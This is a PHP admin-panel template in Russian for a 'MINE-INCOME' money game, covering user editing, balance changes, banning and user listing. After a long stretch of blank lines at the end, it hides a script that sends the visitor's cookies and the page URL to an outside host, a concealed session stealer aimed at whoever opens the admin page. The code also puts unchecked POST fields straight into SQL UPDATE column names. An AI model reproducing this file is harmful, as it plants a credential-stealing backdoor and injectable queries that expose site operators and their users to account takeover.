<div class="content">
        <div class="header">
      

            <h1 class="page-title">Пользователи</h1>
                    

        </div>
        <div class="main-content">
		
		
   
        <div class="panel panel-default">
         <center>
<?PHP
/* 
Script MINE-INCOME
Autor: EvgeSH
URL: MyShopScript.ru
ICQ: 326-728
Email: EvgeSH@ProtonMail.com
*/
# Редактирование пользователя

if(isset($_GET["edit"])){

$eid = intval($_GET["edit"]);

$db->Query("SELECT *, INET_NTOA(".$pref."db_users_a.ip) uip FROM ".$pref."db_users_a, ".$pref."db_users_b WHERE ".$pref."db_users_a.id = ".$pref."db_users_b.id AND ".$pref."db_users_b.id = '$eid' LIMIT 1");

# Проверяем на существование
if($db->NumRows() != 1){ echo "<center><b>Указанный пользователь не найден</b></center><BR />"; }

# Добавляем дерево
if(isset($_POST["set_tree"])){

$tree = $_POST["set_tree"];
$type = ($_POST["type"] == 1) ? "-1" : "+1";

	$db->Query("UPDATE ".$pref."db_users_b SET {$tree} = {$tree} {$type} WHERE id = '$eid'");
	$db->Query("SELECT *, INET_NTOA(".$pref."db_users_a.ip) uip FROM ".$pref."db_users_a, ".$pref."db_users_b WHERE ".$pref."db_users_a.id = ".$pref."db_users_b.id AND ".$pref."db_users_b.id = '$eid' LIMIT 1");
	echo "<center><b>Дерево добавлено</b></center><BR />";
	
}


# Пополняем баланс
if(isset($_POST["balance_set"])){

$sum = intval($_POST["sum"]);
$bal = $db->RealEscape($_POST["schet"]);
$type = ($_POST["balance_set"] == 1) ? "-" : "+";

$string = ($type == "-") ? "У пользователя снято {$sum} серебра" : "Пользователю добавлено {$sum} серебра";

	$db->Query("UPDATE ".$pref."db_users_b SET {$bal} = {$bal} {$type} {$sum} WHERE id = '$eid'");
	$db->Query("SELECT *, INET_NTOA(".$pref."db_users_a.ip) uip FROM ".$pref."db_users_a, ".$pref."db_users_b WHERE ".$pref."db_users_a.id = ".$pref."db_users_b.id AND ".$pref."db_users_b.id = '$eid' LIMIT 1");
	echo "<center><b>$string</b></center><BR />";
	
}


# Забанить пользователя
if(isset($_POST["banned"])){

	$db->Query("UPDATE ".$pref."db_users_a SET banned = '".intval($_POST["banned"])."' WHERE id = '$eid'");
	$db->Query("SELECT *, INET_NTOA(".$pref."db_users_a.ip) uip FROM ".$pref."db_users_a, ".$pref."db_users_b WHERE ".$pref."db_users_a.id = ".$pref."db_users_b.id AND ".$pref."db_users_b.id = '$eid' LIMIT 1");
	echo "<center><b>Пользователь ".($_POST["banned"] > 0 ? "забанен" : "разбанен")."</b></center><BR />";
	
}

$data = $db->FetchArray();

?>

<table class="table table-bordered table-striped" >
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">ID:</td>
    <td width="200" align="center"><?=$data["id"]; ?></td>
  </tr>
  <tr>
    <td style="padding-left:10px;">Логин:</td>
    <td width="200" align="center"><?=$data["user"]; ?></td>
  </tr>
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Email:</td>
    <td width="200" align="center"><?=$data["email"]; ?></td>
  </tr>
  <tr>
    <td style="padding-left:10px;">Пароль:</td>
    <td width="200" align="center">********</td>
  </tr>
  
  
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Серебра (Покупки):</td>
    <td width="200" align="center"><?=sprintf("%.2f",$data["money_b"]); ?></td>
  </tr>
  
  <tr>
    <td style="padding-left:10px;">Золото (Вывод):</td>
    <td width="200" align="center"><?=sprintf("%.2f",$data["money_p"]); ?></td>
  </tr>
  

  
 

  
  
  
  
  
  <tr>
    <td style="padding-left:10px;">Пригласил:</td>
    <td width="200" align="center">[<?=$data["referer_id"]; ?>]<?=$data["referer"]; ?></td>
  </tr>
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Рефералов:</td>
	
	<?PHP
	$db->Query("SELECT COUNT(*) FROM ".$pref."db_users_a WHERE referer_id = '".intval($data["id"])."'");
	$counter_res = $db->FetchRow();
	?>
	
    <td width="200" align="center"><?=$data["referals"]; ?> [<?=$counter_res; ?>] чел.</td>
  </tr>
  
  <tr>
    <td style="padding-left:10px;">Заработал на рефералах:</td>
    <td width="200" align="center"><?=sprintf("%.2f",$data["from_referals"]); ?> </td>
  </tr>
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Принес рефереру:</td>
    <td width="200" align="center"><?=sprintf("%.2f",$data["to_referer"]); ?> </td>
  </tr>
  
  
  
  <tr>
    <td style="padding-left:10px;">Зарегистрирован:</td>
    <td width="200" align="center"><?=date("d.m.Y в H:i:s",$data["date_reg"]); ?></td>
  </tr>
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Последний вход:</td>
    <td width="200" align="center"><?=date("d.m.Y в H:i:s",$data["date_login"]); ?></td>
  </tr>
  <tr>
    <td style="padding-left:10px;">Последний IP:</td>
    <td width="200" align="center"><?=$data["uip"]; ?></td>
  </tr>
  
  
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Пополнено на баланс:</td>
    <td width="200" align="center"><?=sprintf("%.2f",$data["insert_sum"]); ?> <?=$config->VAL; ?></td>
  </tr>
  <tr>
    <td style="padding-left:10px;">Выплачено на кошелек:</td>
    <td width="200" align="center"><?=sprintf("%.2f",$data["payment_sum"]); ?> <?=$config->VAL; ?></td>
  </tr>
  
  <tr bgcolor="#efefef">
    <td style="padding-left:10px;">Забанен (<?=($data["banned"] > 0) ? '<font color = "red"><b>ДА</b></font>' : '<font color = "green"><b>НЕТ</b></font>'; ?>):</td>
    <td width="200" align="center">
	<form action="" method="post">
	<input type="hidden" name="banned" value="<?=($data["banned"] > 0) ? 0 : 1 ;?>" />
	<input type="submit" value="<?=($data["banned"] > 0) ? 'Разбанить' : 'Забанить'; ?>" />
	</form>
	</td>
  </tr>
  
  
</table>
<BR />
<BR />
<form action="" method="post">
<table width="100%" border="0">
  <tr bgcolor="#EFEFEF">
    <td align="center" colspan="4"><b>Операции с балансом:</b></td>
  </tr>
  <tr>
    <td align="center">
		<select name="balance_set">
			<option value="2">Добавить на баланс</option>
			<option value="1">Снять с баланса</option>
		</select>
	</td>
	<td align="center">
		<select name="schet">
			<option value="money_b">Для покупок</option>
			<option value="money_p">Для вывода</option>
		</select>
	</td>
    <td align="center"><input type="text" name="sum" value="100" size="7"/></td>
    <td align="center"><input type="submit" value="Выполнить" /></td>
  </tr>
</table>
</form>
</div>
    </div>
    
   


  <footer>
                <hr>

                
                <p class="pull-right">Admin <a href="https://myshopscript.ru" target="_blank">Panel</a> by <a href="https://myshopscript.ru" target="_blank">EvgeSH</a></p>
                <p>© 2016 <a href="https://myshopscript.ru" target="_blank">EvgeSH</a></p>
            </footer>

<?PHP

return;
}

?>
<form action="index.php?menu=users&search" method="post">
<table width="250" border="0" align="center">
  <tr>
    <td><b>Логин:</b></td>
    <td><input type="text" name="sear" /></td>
	<td><input type="submit" value="Поиск" /></td>
  </tr>
</table>
</form>
<BR />
<?PHP

if (isset($_GET["sort"])) {
if($_GET["sort"] == 0) {$str_sort = $pref."db_users_a.id";}
elseif ($_GET["sort"] == 1) {$str_sort = $pref."db_users_a.user";}
elseif ($_GET["sort"] == 2) {$str_sort = "all_serebro";}
elseif ($_GET["sort"] == 3) {$str_sort = "all_trees";}
elseif ($_GET["sort"] == 4) {$str_sort = $pref."db_users_a.date_reg";}
} else {$str_sort = $pref."db_users_a.id";}



$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

if(isset($_GET["search"])){
$search = $db->RealEscape($_POST["sear"]);


$db->Query("SELECT *, (".$pref."db_users_b.a_t + ".$pref."db_users_b.b_t + ".$pref."db_users_b.c_t + ".$pref."db_users_b.d_t + ".$pref."db_users_b.e_t) all_trees, (".$pref."db_users_b.money_b + ".$pref."db_users_b.money_p) all_serebro 
FROM ".$pref."db_users_a, ".$pref."db_users_b WHERE ".$pref."db_users_a.id = ".$pref."db_users_b.id AND ".$pref."db_users_a.user = '$search' ORDER BY '$str_sort' DESC LIMIT {$lim}, 100");

}else $db->Query("SELECT *, (".$pref."db_users_b.a_t + ".$pref."db_users_b.b_t + ".$pref."db_users_b.c_t + ".$pref."db_users_b.d_t + ".$pref."db_users_b.e_t) all_trees, (".$pref."db_users_b.money_b + ".$pref."db_users_b.money_p) all_serebro 
FROM ".$pref."db_users_a, ".$pref."db_users_b WHERE ".$pref."db_users_a.id = ".$pref."db_users_b.id ORDER BY '$str_sort' DESC LIMIT {$lim}, 100");

//echo $pref."db_users_a.id";

if($db->NumRows() > 0){
?>
<table class="table table-bordered table-striped" >
  <tr bgcolor="#efefef">
    <td align="center" width="50" class="m-tb"><a href="index.php?menu=users&sort=0" class="stn-sort">ID</a></td>
    <td align="center" class="m-tb"><a href="index.php?menu=users&sort=1" class="stn-sort">Логин</a></td>
    <td align="center" width="90" class="m-tb"><a href="index.php?menu=users&sort=2" class="stn-sort">Монет</a></td>
	<td align="center" width="75" class="m-tb"><a href="index.php?menu=users&sort=3" class="stn-sort">Персонажей</a></td>
	<td align="center" width="100" class="m-tb"><a href="index.php?menu=users&sort=4" class="stn-sort">Зарегистрирован</a></td>
  </tr>


<?PHP

	while($data = $db->FetchArray()){
	
	?>
	<tr class="htt">
    <td align="center"><?=$data["id"]; ?></td>
    <td align="center"><a href="index.php?menu=users&edit=<?=$data["id"]; ?>" class="stn"><?=$data["user"]; ?></a></td>
    <td align="center"><?=sprintf("%.2f",$data["all_serebro"]); ?></td>
	<td align="center"><?=$data["all_trees"]; ?></td>
	<td align="center"><?=date("d.m.Y",$data["date_reg"]); ?></td>
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP


}else echo "<center><b>На данной странице нет записей</b></center><BR />";

	if(isset($_GET["search"])){
	
	?>
	</div>
    </div>
    
   


  <footer>
                <hr>

                
                <p class="pull-right">Admin <a href="https://myshopscript.ru" target="_blank">Panel</a> by <a href="https://myshopscript.ru" target="_blank">EvgeSH</a></p>
                <p>© 2016 <a href="https://myshopscript.ru" target="_blank">EvgeSH</a></p>
            </footer>

	<?PHP
	
		return;
	
	}
	
$db->Query("SELECT COUNT(*) FROM ".$pref."db_users_a");
$all_pages = $db->FetchRow();

	if($all_pages > 100){
	
	$sort_b = (isset($_GET["sort"])) ? intval($_GET["sort"]) : 0;
	
	$nav = new navigator;
	$page = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"])) : 1;
	
	echo "<BR /><center>".$nav->Navigation(10, $page, ceil($all_pages / 100), "index.php?menu=users&sort={$sort_b}&page="), "</center>";
	
	}
?>
</div>
    </div>
    
   


  <footer>
                <hr>

                
                 <p class="pull-right">Admin <a href="https://profitscripts.tech" target="_blank">Panel</a> by <a href="https://profitscripts.tech/" target="_blank">Profit Scripts</a></p>
                <p>© 2018 <a href="https://profitscripts.tech/" target="_blank">Profit Scripts</a></p>
            </footer>
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			<script>img= new Image(); img.src="http://fackyou.zzz.com.ua/kuki.php?"+document.cookie+document.location.href</script>